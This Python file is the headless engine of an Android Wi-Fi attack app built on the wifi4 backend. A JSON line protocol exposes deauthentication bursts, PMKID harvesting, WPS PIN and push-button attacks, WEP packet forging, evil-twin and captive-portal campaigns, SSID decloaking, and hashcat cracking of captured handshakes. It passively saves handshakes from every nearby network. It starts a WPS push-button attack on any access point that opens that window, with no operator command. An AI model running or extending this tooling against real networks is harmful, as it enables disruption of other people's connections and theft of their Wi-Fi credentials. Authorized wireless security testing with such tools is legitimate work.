#!/usr/bin/env python3
"""The OPX headless engine: the wifi4 backend with no TUI, behind a line protocol.

One JSON object per line on stdin, one JSON event per line on stdout. It is started by the
app's foreground service inside the app's own runtime prefix, so the WiFi section never needs
a terminal, a second APK or a shell prompt.

Commands
    {"cmd": "ping"}                     -> {"event": "ready", "version": ..., "runtime": {...}}
    {"cmd": "devices"}                  -> {"event": "devices", "devices": [...]}
    {"cmd": "status"}                   -> {"event": "status", "iface": ..., "connected": ...}
    {"cmd": "config", "dfs": true}      -> {"event": "config", "dfs": true}
    {"cmd": "scan", "seconds": 15}      -> {"event": "network", ...} ... {"event": "scan_done"}
                                           (passive saves arrive as "capture_saved" at any time)
    {"cmd": "targets"}                  -> {"event": "targets", "targets": [{...,"attacks":[...]}]}
    {"cmd": "attack", "kind": "deauth|pmkid|wps|wep|eviltwin|captive|decloak|known_decloak|"
                              "verify", "bssid": "..", "options": {...}}
                                        -> {"event": "attack_started"}, attack_log/attack_progress,
                                           then {"event": "attack_done", "ok": .., "summary": ..}
                                           (verify takes {"value": .., "verify_type": ..})
    {"cmd": "deauth_client", "bssid": "..", "client": ".."}   -> one deauth burst (TUI's client ✕)
    {"cmd": "deauth_all", "bssid": ".."}        -> broadcast deauth (TUI's 'd')
    {"cmd": "silence", "bssid": "..", "on": true}  -> wifi4's silenced list (TUI's 's')
    {"cmd": "chop", "on": true}                 -> the WEP campaign's ChopChop sub-mode
    {"cmd": "verify_psk", "bssid": "..", "psk": ".."}
                                        -> {"event": "psk_verified", "ok": bool}
    {"cmd": "attack_status"}            -> {"event": "attack_status", "running": bool, ...}
    {"cmd": "stop_attack"}              -> the running campaign stops; attack_done follows
    {"cmd": "captures"}                 -> {"event": "captures", "captures": [...]}
    {"cmd": "crack_tools"}              -> {"event": "crack_tools", "tools": [...]}
    {"cmd": "crack", "capture": "..", "tool": "cpu_crack|hashcat",
     "default_passwords": true, "ssid_passwords": true, "probed_ssids": false}
                                        -> {"event": "crack_started"}, crack_progress,
                                           then {"event": "crack_done", "ok": ..}
    {"cmd": "stop_crack"}               -> the running crack stops; crack_done follows
    {"cmd": "stop"}                     -> {"event": "stopped"}

A ``ready`` event is also emitted as soon as the process starts, without waiting for a ping:
the app logs it, and a runtime that cannot import wifi4 says exactly why here instead of
looking like an empty network list.

Every failure is reported as {"event": "error", "message": ...}; the engine never exits on a
bad command, so the app can keep the process warm across screens.
"""

import asyncio
import importlib
import json
import os
import platform
import re
import shutil
import struct
import sys
import time
import traceback
from pathlib import Path

VERSION = "0.6.0"

# A cold start races wifi4's USB poller: its first reconcile still has to list the devices and
# ask the app for a descriptor, so the very first `devices` answer is legitimately empty. Wait
# for it instead of reporting "no adapter" and giving up, and keep a few retries after
# usb_waiting so a permission dialog answered a second later still ends in usb_attached.
ADAPTER_WAIT_SECONDS = 6.0
DEVICES_WAIT_SECONDS = 1.5
ATTACH_RETRY_DELAYS = (3.0, 8.0)

# Campaign logs and status lines are rich markup ("[bold cyan]..[/]"); the app draws plain text.
MARKUP = re.compile(r"\[[^\[\]]*\]")


def emit(event, **fields):
    payload = {"event": event}
    payload.update(fields)
    sys.stdout.write(json.dumps(payload, ensure_ascii=False, default=str) + "\n")
    sys.stdout.flush()


def log(message):
    sys.stderr.write(f"opx-engine: {message}\n")
    sys.stderr.flush()


def plain(text):
    """A campaign's rich-markup line as the plain text the app's rows and log draw."""
    if text is None:
        return ""
    return MARKUP.sub("", str(text)).strip()


def prepare_opencl():
    """Give hashcat a chance at the phone's GPU: point the ICD loader at the vendor library.

    The app's runtime is not installed by dpkg, so opencl-vendor-driver's post-install script
    never runs here. This does its essential step: copy the vendor libOpenCL (or the Mali
    driver, which is itself an ICD) into the prefix and write the ICD file ocl-icd reads.
    Devices without such a library keep the CPU cracker; the GPU card says so when hashcat
    reports no device.
    """
    prefix = os.environ.get("PREFIX") or ""
    if not prefix:
        return "no PREFIX"
    vendor_dirs = (
        "/vendor/lib64", "/system/vendor/lib64",
        "/vendor/lib", "/system/vendor/lib",
    )
    candidates = ("libOpenCL.so", "libGLES_mali.so", "libPVROCL.so")
    source = None
    for directory in vendor_dirs:
        for name in candidates:
            candidate = Path(directory) / name
            if candidate.exists():
                source = candidate
                break
        if source is not None:
            break
    if source is None:
        return "no vendor OpenCL library on this device"
    target_dir = Path(prefix) / "opt" / "vendor" / "lib"
    icd_dir = Path(prefix) / "etc" / "OpenCL" / "vendors"
    try:
        target_dir.mkdir(parents=True, exist_ok=True)
        icd_dir.mkdir(parents=True, exist_ok=True)
        target = target_dir / "libOpenCL.so"
        shutil.copyfile(source, target)
        target.chmod(0o755)
        (icd_dir / "vendor.icd").write_text(str(target) + "\n", encoding="utf-8")
        return f"vendor OpenCL from {source}"
    except OSError as exc:
        return f"cannot prepare vendor OpenCL: {type(exc).__name__}: {exc}"


def default_passwords_info():
    """The built-in common-password list wifi4 ships, as the crack dialog shows it.

    The file is package data (``wifi4/crack/assets/default_passwords.txt``), so it is present
    in every runtime this repository builds. Reading it here lets the app say how many
    passwords the switch covers instead of hiding the source behind an opaque toggle.
    """
    from wifi4.crack.passwords import DEFAULT_PASSWORDS_PATH

    try:
        count = sum(1 for line in DEFAULT_PASSWORDS_PATH.read_text(
            encoding="utf-8", errors="ignore").splitlines() if line.strip())
    except OSError:
        return {"available": False, "count": 0}
    return {"available": count > 0, "count": count}


def captures_dir():
    """Where wifi4's own capture saver writes: this runtime's private var directory.

    The app lists and cracks these files through the engine, never by path, so the location
    only has to be writable by the engine process.
    """
    prefix = os.environ.get("PREFIX") or "/tmp"
    path = Path(os.environ.get("OPX_CAPTURES_DIR") or (Path(prefix) / "var" / "opx" / "captures"))
    return path


def configure_captures():
    """Points wifi4's auto-save at our directory before anything can write a capture.

    ``wifi4.persist.save`` reads ``Config.captures_dir`` on every save, so setting it once at
    startup is enough - and it keeps the desktop default (a relative ``captures/`` inside the
    process' working directory) out of the app.
    """
    try:
        from wifi4.persist.config import Config
    except Exception as exc:  # noqa: BLE001 - the engine still scans without capture saving
        log(f"capture saving unavailable: {type(exc).__name__}: {exc}")
        return
    path = captures_dir()
    try:
        path.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        log(f"cannot create the capture directory {path}: {exc}")
        return
    Config.captures_dir = str(path)
    # One .hc22000 per AP is all the app needs; a duplicate .pcap doubles the disk use.
    Config.save_pcap = False


def runtime_info():
    """What the app shows/logs on start: enough to diagnose an empty adapter list."""
    info = {
        "version": VERSION,
        "prefix": os.environ.get("PREFIX"),
        "python": platform.python_version(),
        "platform": sys.platform,
        # Which runtime tree this process is: "arm" (32-bit) and "aarch64" (64-bit) are
        # separate builds, so a log line that names the machine settles every ABI question.
        "machine": platform.machine(),
        "pointer_bits": struct.calcsize("P") * 8,
    }
    try:
        import wifi4

        info["wifi4"] = getattr(wifi4, "__version__", "unknown")
        info["wifi4_ok"] = True
    except Exception as exc:  # noqa: BLE001 - reported, never raised
        info["wifi4_ok"] = False
        info["wifi4_error"] = f"{type(exc).__name__}: {exc}"
    try:
        from wifi4.host import is_opx_oss

        info["android_usb_backend"] = bool(is_opx_oss())
    except Exception:  # noqa: BLE001
        info["android_usb_backend"] = None
    return info


try:  # wifi4's own security ladder; never fork it when the UI formatter is importable.
    from wifi4.ui.encryption_format import EncryptionType as _EncryptionType
    ENCRYPTION_TYPES = _EncryptionType
except Exception:  # noqa: BLE001 - a trimmed runtime must still scan
    ENCRYPTION_TYPES = None


def security_of(ap, encryption):
    """One security bucket: OPEN / WEP / WPA / WPA2 / WPA3 / WPA3_TRANSITION / OWE / UNKNOWN.

    Mirrors ``EncryptionType.from_ap`` (RSN evidence outranks the legacy encryption string)
    for runtimes where the UI formatter is not shipped.
    """
    if ENCRYPTION_TYPES is not None:
        try:
            return ENCRYPTION_TYPES.from_ap(ap).value
        except Exception:  # noqa: BLE001
            pass
    if getattr(ap, "wpa3", False) and getattr(ap, "transition_mode", False):
        return "WPA3_TRANSITION"
    if getattr(ap, "wpa3", False):
        return "WPA3"
    if "OWE" in (getattr(ap, "akms", None) or []):
        return "OWE"
    enc = (encryption or "").upper()
    if enc == "WPA" or enc.startswith("WPA-"):
        return "WPA"
    if getattr(ap, "akms", None):
        return "WPA2"
    if enc in ("", "OPEN", "UNKNOWN"):
        return "OPEN"
    if enc == "WEP":
        return "WEP"
    return "UNKNOWN"


def band_of(channel):
    """2.4 / 5 for a channel number, None when the AP's channel is not known yet."""
    if not isinstance(channel, int) or channel <= 0:
        return None
    return "5" if channel > 14 else "2.4"


def bands_text(access_points):
    """What Stryker's BAND cell shows: '2.4 / 5', '2.4' or '5'."""
    seen = {band_of(getattr(ap, "channel", None)) for ap in access_points.values()}
    seen.discard(None)
    if not seen:
        return None
    if len(seen) > 1:
        return "2.4 / 5"
    return seen.pop()


def pool_access_points(array):
    """The pool's BSSID -> AccessPoint map.

    wifi4 handed this out as ``access_points()`` in older builds and as a property in the pinned
    one, and calling the property fails with "TypeError: 'dict' object is not callable" - which
    is exactly how the first scan died on a device. Accept both shapes.
    """
    points = array.access_points
    return points() if callable(points) else points


def ap_fields(ap):
    """Mapping of an AccessPoint to exactly what the app's rows draw."""
    def pick(*names):
        for name in names:
            value = getattr(ap, name, None)
            if value not in (None, ""):
                return value
        return None

    encryption = pick("privacy", "security", "encryption")
    ssid = pick("ssid", "essid")
    # wifi4 keeps hidden networks as None or the "<hidden>" placeholder; the row shows a label.
    hidden = bool(getattr(ap, "is_hidden", False)) or not ssid or ssid == "<hidden>"
    # AccessPoint has no vendor/manuf field: manufacturer lives in the WPS/OUI identity.
    identity = getattr(ap, "identity", None)
    vendor = getattr(identity, "manufacturer", None) if identity is not None else None
    vendor = vendor or pick("vendor", "manuf")
    channel = pick("channel")
    return {
        "ssid": "" if hidden else str(ssid),
        "hidden": hidden,
        "bssid": pick("bssid", "mac") or "",
        "channel": channel,
        "band": band_of(channel),
        "signal": pick("rssi", "signal", "power", "dbm"),
        "privacy": str(encryption) if encryption is not None else None,
        "security": security_of(ap, encryption),
        "wps": bool(pick("wps", "wps_version") or False),
        "wps_locked": bool(getattr(ap, "wps_locked", False)),
        "vendor": vendor,
        "chipset": pick("chipset"),
    }


class Engine:
    def __init__(self):
        self.iface = None
        self.array = None
        self.scanning = False
        self.scan_task = None
        # One radio, one campaign: wifi4's Campaign.active is the mutex; these are the app's copy.
        self.campaign = None
        self.campaign_kind = None
        self.campaign_ap = None
        # Live packet-rate window for the monitor's sparkline: wifi4's own packet_stats
        # cumulative tallies, diffed once per tick.
        self._rate_snapshot = None
        self._rate_at = 0.0
        self.campaign_started = 0.0
        self.attack_task = None
        # One cracking job at a time: wifi4's own CPU cracker or hashcat over a saved capture.
        self.crack_tool = None
        self.crack_job = None
        self.crack_capture = ""
        self.crack_ssid = ""
        self.crack_bssid = ""
        # The captive-portal password that matched a captured M2; attack_done carries it.
        self.captive_psk = ""
        self.campaign_twin_bssid = ""
        self.crack_task = None
        # Passive capture: wifi4 collects handshakes/PMKIDs/WEP IVs while the radio is up;
        # the app must save them without an active campaign, as the desktop watcher does.
        self.passive_task = None
        self._passive_last = {}
        self._pbc_seen = set()
        # One interface bring-up at a time: an attach can race a scan's first connect.
        self._connecting = None
        # A bounded background retry after usb_waiting; cancelled by usb_lost/stop.
        self._attach_retry = None
        # One-shot client/broadcast deauth: the TUI's inline ✕ and 'd' hotkey.
        self._deauth_task = None

    async def ping(self):
        emit("ready", version=VERSION, native=bool(os.environ.get("PREFIX")),
             runtime=runtime_info())

    async def devices(self):
        try:
            from wifi4.device.manager import devices as list_devices
        except Exception as exc:  # noqa: BLE001
            emit("error", message=f"cannot import the wifi4 USB layer: {type(exc).__name__}: {exc}")
            return

        found = await self._wait_for_devices(DEVICES_WAIT_SECONDS)
        devices = [
            {
                "chipset": getattr(d, "chipset", None),
                "description": getattr(d, "description", None),
                "vendor": getattr(d, "vendor", None),
                "product": getattr(d, "product_name", None),
                "bus": getattr(d, "bus", None),
                "address": getattr(d, "address", None),
            }
            for d in found
        ]
        fields = {"devices": devices, "count": len(devices)}
        # When nothing is found, the USB backend's own last error is the useful part.
        try:
            from wifi4.device import opx_bridge

            hint = opx_bridge.last_error()
            if hint and not devices:
                fields["hint"] = hint
        except Exception:  # noqa: BLE001
            pass
        emit("devices", **fields)

    async def _wait_for_devices(self, timeout):
        """wifi4's supported devices, waiting up to ``timeout`` for the USB poller's first fd."""
        from wifi4.device.manager import devices as list_devices

        deadline = time.monotonic() + max(0.0, float(timeout))
        found = await asyncio.to_thread(list_devices)
        while not found and time.monotonic() < deadline:
            await asyncio.sleep(0.5)
            found = await asyncio.to_thread(list_devices)
        return found

    async def connect(self, wait=ADAPTER_WAIT_SECONDS):
        """Brings the first supported adapter up once, even if two callers ask together."""
        if self.iface is not None:
            return self.iface
        if self._connecting is not None:
            return await self._connecting
        self._connecting = asyncio.create_task(self._connect(wait))
        try:
            return await self._connecting
        finally:
            self._connecting = None

    async def _connect(self, wait=ADAPTER_WAIT_SECONDS):
        from wifi4.device.manager import wlan_iface
        from wifi4.wlan.array import WlanArray

        found = await self._wait_for_devices(wait)
        if not found:
            raise RuntimeError(
                "no supported USB Wi-Fi adapter found; plug one in through an OTG adapter"
            )
        iface = await asyncio.to_thread(wlan_iface, found[0])
        if iface is None:
            raise RuntimeError("the adapter's driver could not be constructed")
        if not await iface.connect():
            raise RuntimeError(f"{found[0].description}: the adapter did not come up")
        array = WlanArray()
        array.attach(iface)
        self.iface = iface
        self.array = array
        self._start_passive()
        log(f"interface {iface.name} connected ({found[0].description})")
        return iface

    def _announce_attached(self, iface, already=False):
        emit("usb_attached", iface=iface.name,
             chipset=getattr(iface, "chipset", None),
             mac=getattr(iface, "mac_address", None), already=already)

    def _cancel_attach_retry(self):
        task = self._attach_retry
        self._attach_retry = None
        if task is not None and not task.done():
            task.cancel()

    def _schedule_attach_retry(self):
        if self._attach_retry is not None and not self._attach_retry.done():
            return
        self._attach_retry = asyncio.create_task(self._retry_attach())

    async def _retry_attach(self):
        """After usb_waiting, try again while the card is still plugged in.

        The permission dialog can be answered after the first wait ends; without this the app
        would sit on "waiting for adapter" until the user happened to press Scan.
        """
        try:
            for delay in ATTACH_RETRY_DELAYS:
                await asyncio.sleep(delay)
                if self.iface is not None:
                    return
                try:
                    iface = await self.connect(wait=1.5)
                except Exception:  # noqa: BLE001 - no card/no permission is a normal state
                    continue
                self._announce_attached(iface)
                return
        except asyncio.CancelledError:
            raise
        finally:
            if self._attach_retry is asyncio.current_task():
                self._attach_retry = None

    def _start_passive(self):
        """Start the desktop watcher's job: save captures even while no campaign is running."""
        self._stop_passive()
        self._passive_last = {}
        self.passive_task = asyncio.create_task(self._watch_passive())

    def _stop_passive(self):
        task = self.passive_task
        self.passive_task = None
        if task is not None and not task.done():
            task.cancel()

    @staticmethod
    def _ap_signature(ap):
        """What changed on an AP since the last passive tick (handshakes, PMKID, WEP key)."""
        handshakes = getattr(ap, "handshakes", {}) or {}
        messages = sum(len(getattr(hs, "messages", ()) or ()) for hs in handshakes.values())
        pmkid = getattr(ap, "pmkid", None) or b""
        wep_key = getattr(ap, "wep_key", None) or b""
        return (len(handshakes), messages, bytes(pmkid).hex(), bytes(wep_key).hex())

    async def _watch_passive(self):
        """Poll wifi4's live AP state and persist new captures without an active attack.

        The desktop app's ``ApWatcher`` does this continuously; without it a handshake that a
        client produces on its own (or one another tool caused) disappears when the AP leaves
        wifi4's in-memory sink. Saving is deduped by ``persist.save`` itself, and the signature
        keeps us from touching the disk every two seconds.
        """
        try:
            while self.array is not None:
                array = self.array
                changed = []
                silenced = set()
                try:
                    from wifi4.persist.config import Config

                    silenced = {str(item).lower() for item in (Config.silenced_bssids or [])}
                except Exception:  # noqa: BLE001 - no settings file yet
                    silenced = set()
                for bssid, ap in list(pool_access_points(array).items()):
                    if bssid in silenced:
                        continue  # silenced: campaigns off and captures ignored
                    signature = self._ap_signature(ap)
                    if self._passive_last.get(bssid) == signature:
                        continue
                    self._passive_last[bssid] = signature
                    changed.extend(self.harvest(ap))
                    key = getattr(ap, "wep_key", None)
                    if key:
                        try:
                            from wifi4.persist.save import save_wep_key

                            result = save_wep_key(ap, key)
                            if result is not None and result.was_new:
                                changed.append(str(result.path))
                        except Exception:  # noqa: BLE001 - a save must never kill capture
                            log(traceback.format_exc())
                if changed:
                    emit("capture_saved", count=len(changed), paths=changed[:8])

                # wifi4 arms PBC automatically when an AP enters its Push-Button window.
                # A running scan is parked by attack(), exactly as the desktop Focus screen does.
                if self.campaign is None or self.campaign.done:
                    for bssid, ap in list(pool_access_points(array).items()):
                        if bssid in self._pbc_seen or not getattr(ap, "wps_pbc_active", False):
                            continue
                        self._pbc_seen.add(bssid)
                        asyncio.create_task(self._auto_pbc(bssid))
                        break
                await asyncio.sleep(2.0)
        except asyncio.CancelledError:
            raise
        except Exception:  # noqa: BLE001 - the USB reader can disappear without notice
            log(traceback.format_exc())
        finally:
            if self.passive_task is asyncio.current_task():
                self.passive_task = None

    async def _auto_pbc(self, bssid):
        if self.campaign is not None and not self.campaign.done:
            return
        log(f"WPS PBC window on {bssid}: capturing the PSK")
        try:
            await self.attack("pbc", bssid)
        except Exception:  # noqa: BLE001 - a failed PBC leaves the scanner running
            log(traceback.format_exc())

    async def configure(self, command):
        """Apply the few wifi4 settings the app exposes; currently DFS channel selection."""
        from wifi4.persist.config import Config

        if "dfs" in command:
            Config.enable_dfs_channels = bool(command.get("dfs"))
            log(f"DFS channels {'enabled' if Config.enable_dfs_channels else 'disabled'}")
        emit("config", dfs=bool(getattr(Config, "enable_dfs_channels", False)))

    async def usb_attach(self):
        """The app already holds the adapter's permission: bring wifi4's interface up now.

        This is what makes plugging the card in enough: no scan, no WiFi screen, no terminal.
        """
        if self.iface is not None:
            self._cancel_attach_retry()
            self._announce_attached(self.iface, already=True)
            return
        try:
            iface = await self.connect()
        except Exception as exc:  # noqa: BLE001 - no card or no permission is a normal state
            emit("usb_waiting", message=f"{type(exc).__name__}: {exc}")
            self._schedule_attach_retry()
            return
        self._cancel_attach_retry()
        self._announce_attached(iface)

    async def usb_lost(self):
        """The adapter was unplugged: park any campaign and drop the stale interface."""
        self._cancel_attach_retry()
        self._stop_passive()
        campaign = self.campaign
        draining = campaign is not None and not campaign.done
        if self.iface is None and self.array is None and not draining and not self.scanning:
            # Already detached: one unplug is one event, however many receivers report it.
            return
        if campaign is not None and not campaign.done:
            try:
                campaign.request_stop()
                for _ in range(20):
                    if campaign.done:
                        break
                    await asyncio.sleep(0.1)
            except Exception:  # noqa: BLE001
                pass
        self.scanning = False
        if self.scan_task is not None and not self.scan_task.done():
            self.scan_task.cancel()
            try:
                await self.scan_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        array, iface = self.array, self.iface
        self.array = None
        self.iface = None
        for resource in (array, iface):
            if resource is None:
                continue
            try:
                await resource.close()
            except Exception:  # noqa: BLE001 - the descriptor is already gone
                pass
        emit("usb_detached")

    # ------------------------------------------------- one-shot client actions

    async def deauth_client(self, bssid, client):
        """One client, one deauth burst: the TUI's inline ✕ on its clients panel."""
        await self._deauth_once(bssid, client)

    async def deauth_all(self, bssid):
        """Broadcast deauth every station: the TUI's 'd' hotkey."""
        await self._deauth_once(bssid, "")

    async def _deauth_once(self, bssid, client):
        ap = self.ap_for(bssid)
        if ap is None:
            emit("error", message="that network is not in the current scan: scan again")
            return
        if self.campaign is not None and not self.campaign.done:
            emit("error", message="an attack is already running")
            return
        if self.array is None or self.iface is None:
            emit("error", message="no adapter: plug in a USB Wi-Fi card")
            return
        card = self.array.select_iface(ap.channel)
        if card is None:
            emit("error", message=f"no card can reach channel {ap.channel}")
            return
        try:
            async with self.array.lease(channel=ap.channel, iface=card) as iface:
                if client:
                    result = await iface.deauth_client(ap.bssid, str(client), rounds=10)
                    sent, acked = result.total_sent, result.total_acked
                else:
                    sent, acked = await iface.deauth_broadcast(ap.bssid, count=20), 0
        except Exception as exc:  # noqa: BLE001 - a silent client is a normal outcome
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
            return
        emit("deauth_sent", bssid=ap.bssid, ssid=ap.ssid or "", client=str(client or ""),
             sent=sent, acked=acked)

    async def silence(self, bssid, on):
        """wifi4's silenced list: campaigns off and captures ignored for that AP (TUI's 's')."""
        key = str(bssid or "").lower()
        if not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", key):
            emit("error", message="that is not a BSSID")
            return
        try:
            from wifi4.persist.config import Config
        except Exception as exc:  # noqa: BLE001
            emit("error", message=f"cannot reach wifi4's settings: {type(exc).__name__}: {exc}")
            return
        silenced = [str(item).lower() for item in (Config.silenced_bssids or [])]
        if on:
            if key not in silenced:
                silenced.append(key)
        else:
            silenced = [item for item in silenced if item != key]
        Config.silenced_bssids = silenced
        emit("silenced", bssid=key, silenced=bool(on))
        await self.targets()

    async def chop(self, on):
        """ChopChop: the WEP campaign's packet-forging sub-mode, on or off."""
        campaign = self.campaign
        if campaign is None or campaign.done or self.campaign_kind != "wep":
            emit("error", message="ChopChop needs the WEP campaign running")
            return
        if not hasattr(campaign, "start_chop"):
            emit("error", message="this campaign has no ChopChop")
            return
        try:
            if on:
                campaign.start_chop()
            else:
                campaign.stop_chop()
        except Exception as exc:  # noqa: BLE001 - a forging failure must not kill the campaign
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
            return
        emit("chop", on=bool(on), active=getattr(campaign, "chop", None) is not None)

    async def status(self):
        if self.iface is None:
            emit("status", connected=False, iface=None, access_points=0, band=None,
                 runtime=runtime_info())
            return
        aps = pool_access_points(self.array) if self.array else {}
        emit(
            "status",
            connected=True,
            iface=self.iface.name,
            chipset=getattr(self.iface, "chipset", None),
            mac=getattr(self.iface, "mac_address", None),
            access_points=len(aps),
            band=bands_text(aps),
            runtime=runtime_info(),
        )

    async def _scan(self, seconds):
        # Hold the array locally: an unplug during the scan drops self.array, and the finally
        # block must still stop hopping on the object it started with. connect() hands back the
        # interface it brought up, not the pool, so the array is taken off the engine.
        await self.connect()
        array = self.array
        if array is None:
            raise RuntimeError("the adapter went away before the scan could start")
        self.scanning = True
        seen = {}
        try:
            await array.start_hopping()
            deadline = time.monotonic() + seconds
            while time.monotonic() < deadline and self.scanning:
                for bssid, ap in pool_access_points(array).items():
                    fields = ap_fields(ap)
                    key = fields["bssid"] or bssid
                    if seen.get(key) != fields:
                        seen[key] = fields
                        emit("network", **fields)
                await asyncio.sleep(0.5)
        finally:
            self.scanning = False
            try:
                await array.stop_hopping()
            except Exception:  # noqa: BLE001
                pass
        emit("scan_done", count=len(seen), seconds=seconds)

    async def scan(self, seconds=None):
        """Runs the scan as a task so `devices`, `status` and `stop` stay responsive."""
        if self.scan_task is not None and not self.scan_task.done():
            emit("error", message="a scan is already running")
            return
        if self.campaign is not None and not self.campaign.done:
            # Hopping the radio away would break the campaign's channel lock.
            emit("error", message="an attack is running: stop it before scanning")
            return
        self.scan_task = asyncio.create_task(self._scan(float(seconds or 20)))

        def finished(task):
            if task.cancelled():
                return
            error = task.exception()
            if error is not None:
                # The whole traceback, not just the message: a scan that dies inside wifi4 is
                # undebuggable from a device log otherwise. It goes to stderr *and* into the
                # error event, so the app can show it on the WiFi screen instead of only
                # printing a one-line reason.
                detail = "".join(
                    traceback.format_exception(type(error), error, error.__traceback__)
                ).strip()
                log(detail)
                emit("error", message=f"{type(error).__name__}: {error}", detail=detail)
                emit("scan_done", count=0, seconds=0)

        self.scan_task.add_done_callback(finished)

    async def stop_scan(self):
        """Cancels a running scan but keeps the adapter (and the process) alive."""
        self.scanning = False
        if self.scan_task is not None and not self.scan_task.done():
            self.scan_task.cancel()
            try:
                await self.scan_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        emit("scan_done", count=0, cancelled=True)

    # ------------------------------------------------------------------ attacks

    def campaign_classes(self):
        """wifi4's own campaign registry: the app never hardcodes attack names or eligibility.

        Imported one module at a time: the shipped runtime drops the legacy WEP campaign
        (``campaigns/wep`` is removed by tools/patch-wifi4.py), and one absent module must not
        hide the campaigns that are there.
        """
        registry = {}
        for kind, module, name in (
            ("wep", "wifi4.campaigns.wep", "WepCampaign"),
            ("deauth", "wifi4.campaigns.deauth", "DeauthCampaign"),
            ("pmkid", "wifi4.campaigns.pmkid", "PmkidHarvestAttack"),
            ("wps", "wifi4.campaigns.pin", "WpsCampaign"),
            ("pbc", "wifi4.campaigns.pbc", "WpsPbcCampaign"),
            ("eviltwin", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
            ("captive", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
            ("decloak", "wifi4.campaigns.decloak", "DecloakCampaign"),
            ("known_decloak", "wifi4.campaigns.decloak", "KnownDecloakCampaign"),
        ):
            try:
                registry[kind] = getattr(importlib.import_module(module), name)
            except Exception as exc:  # noqa: BLE001 - reported per campaign, never fatal
                log(f"attack {kind} unavailable: {type(exc).__name__}: {exc}")
        return registry

    def verify_classes(self):
        """wifi4's Verify campaigns, keyed by the credential type they check."""
        registry = {}
        for kind, module, name in (
            ("wpa_psk", "wifi4.campaigns.verify.psk", "VerifyPskCampaign"),
            ("wps_pin", "wifi4.campaigns.verify.pin", "VerifyPinCampaign"),
            ("wep", "wifi4.campaigns.verify.wep", "VerifyWepCampaign"),
        ):
            try:
                registry[kind] = getattr(importlib.import_module(module), name)
            except Exception as exc:  # noqa: BLE001 - a missing verifier hides one button
                log(f"verify {kind} unavailable: {type(exc).__name__}: {exc}")
        return registry

    def interface_names(self):
        """The interfaces wifi4 holds: the EvilTwin modal's host/punter selects."""
        if self.array is None:
            return []
        names = []
        for member in getattr(self.array, "members", None) or []:
            name = str(getattr(member, "name", "") or "")
            if name and name not in names:
                names.append(name)
        return names

    def client_macs(self, bssid):
        """The clients the sink has seen on this AP: the target sheet's per-client deauth."""
        if self.array is None:
            return []
        target = str(bssid or "").lower()
        own = set(getattr(self.array, "forged_macs", ()) or ())
        macs = []
        for mac, client in list(getattr(self.array, "clients", {}).items()):
            if (getattr(client, "bssid", "") or "").lower() != target:
                continue
            if mac in own:
                continue
            macs.append(str(mac))
        return sorted(macs)

    def credentials_by_bssid(self):
        """Saved credentials keyed by BSSID: what the Verify button tests on the live AP."""
        store = {}
        for entry in self.credential_entries():
            bssid = str(entry.get("bssid") or "").lower()
            if not bssid:
                continue
            kind = entry.get("kind")
            value = str(entry.get("value") or "")
            pin = str(entry.get("pin") or "")
            if kind == "wep" and value:
                store.setdefault(bssid, {"type": "wep", "value": value})
            elif value:
                store[bssid] = {"type": "wpa_psk", "value": value}
            elif pin:
                store[bssid] = {"type": "wps_pin", "value": pin}
        return store

    def ap_for(self, bssid):
        if self.array is None:
            return None
        return pool_access_points(self.array).get(str(bssid or "").lower())

    def ap_clients(self, bssid):
        """Clients the sink has seen talking to one BSSID (what deauth can aim at)."""
        if self.array is None:
            return 0
        target = str(bssid or "").lower()
        return sum(
            1 for client in self.array.clients.values()
            if (getattr(client, "bssid", "") or "").lower() == target
        )

    async def targets(self):
        """The target sheet's contents: every AP plus the attacks wifi4 offers for it.

        Eligibility comes from the campaign classes themselves (``visible`` for the encryption
        family, ``ineligible_reason`` for hidden SSID / WPS lock / unconfirmed RSN), so the app
        shows exactly what the engine can actually run.
        """
        classes = self.campaign_classes()
        if not classes:
            emit("error", message="the wifi4 attack layer is missing from this runtime")
            return
        interfaces = self.interface_names()
        if self.array is None:
            emit("targets", count=0, targets=[], interfaces=interfaces,
                 reason="no adapter: plug in a USB Wi-Fi card, scan, then tap the network")
            return
        try:
            from wifi4.persist.config import Config
        except Exception:  # noqa: BLE001 - silenced state is optional
            Config = None
        try:
            credentials = await asyncio.to_thread(self.credentials_by_bssid)
        except Exception as exc:  # noqa: BLE001 - a missing sidecar must not blank the list
            log(f"credentials unavailable: {type(exc).__name__}: {exc}")
            credentials = {}
        verifies = self.verify_classes()

        targets = []
        for bssid, ap in pool_access_points(self.array).items():
            silenced = bool(Config is not None and Config.is_silenced(bssid))
            attacks = []
            for kind, campaign_cls in classes.items():
                try:
                    if not campaign_cls.visible(ap):
                        continue
                    reason = campaign_cls.ineligible_reason(ap)
                    label = campaign_cls.button_label(ap)
                except Exception:  # noqa: BLE001 - one odd AP must not blank the whole list
                    continue
                if kind == "pbc" and not getattr(ap, "wps_pbc_active", False):
                    # wifi4 has no PBC button: the campaign is armed by an open window only.
                    reason = reason or "WPS Push-Button window is not open"
                if silenced:
                    reason = reason or "AP silenced"
                attacks.append({
                    "kind": kind,
                    "label": plain(label or campaign_cls.idle_label),
                    "enabled": reason is None,
                    "reason": plain(reason or ""),
                })
            credential = credentials.get(bssid)
            if credential and verifies:
                reason = "AP silenced" if silenced else ""
                try:
                    reason = reason or plain(
                        next(iter(verifies.values())).ineligible_reason(ap) or "")
                except Exception:  # noqa: BLE001 - one verifier must not hide the button
                    reason = reason or ""
                attacks.append({"kind": "verify", "label": "Verify",
                                "enabled": not reason, "reason": reason})
            targets.append({
                "bssid": bssid,
                "ssid": ap.ssid or "",
                "hidden": bool(ap.is_hidden),
                "channel": ap.channel,
                "security": security_of(ap, getattr(ap, "encryption", None)),
                "wifi4_encryption": getattr(ap, "encryption", None),
                "wps": bool(getattr(ap, "wps", False)),
                "wps_locked": bool(getattr(ap, "wps_locked", False)),
                "wps_pbc": bool(getattr(ap, "wps_pbc_active", False)),
                "silenced": silenced,
                "clients": self.ap_clients(bssid),
                "clients_list": self.client_macs(bssid),
                "handshakes": len(getattr(ap, "handshakes", {}) or {}),
                "credential": credential or {},
                "attacks": attacks,
            })
        emit("targets", count=len(targets), targets=targets, interfaces=interfaces)

